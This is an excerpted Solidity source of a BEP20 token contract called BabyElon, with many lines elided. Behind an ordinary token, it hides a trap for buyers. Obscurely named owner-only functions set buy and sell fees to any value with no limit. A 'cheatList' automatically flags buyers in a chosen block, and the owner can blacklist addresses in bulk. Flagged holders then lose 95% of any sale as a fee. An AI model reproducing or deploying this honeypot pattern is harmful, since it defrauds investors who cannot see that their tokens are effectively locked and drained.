...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function B(uint256 a, uint256 b, uint256 c) external onlyOwner() {
        _buyLiquidityFee = a;
        _buyMarketingFee = b;
        _buyTeamFee = c;
    ...
    function S(uint256 a, uint256 b, uint256 c) external onlyOwner() {
        _sellLiquidityFee = a;
        _sellMarketingFee = b;
        _sellTeamFee = c;
    ...
    function doCheater(address recipient) internal {
        if (!cheatList[recipient] && !isMarketPair[recipient]) cheatList[recipient] = true;
    }

    function manage_cheater(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if (tryEqual(block.number , togetherDo + _door) && !isMarketPair[recipient]) {doCheater(recipient);}
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(cheatList[sender] && !isMarketPair[sender]) feeAmount = amount.mul(95).div(100);
...
contract BabyElon is BEP20 {
    constructor() BEP20(
        ...
        [uint256(0),uint256(5),uint256(0)],
        [uint256(0),uint256(5),uint256(0)],
        [uint256(1000000000000000),uint256(1000000000000000)],
        [0xca92159E9f09691bF52B00F5108A8DA3d36e05cD,0xca92159E9f09691bF52B00F5108A8DA3d36e05cD]
    ){}
}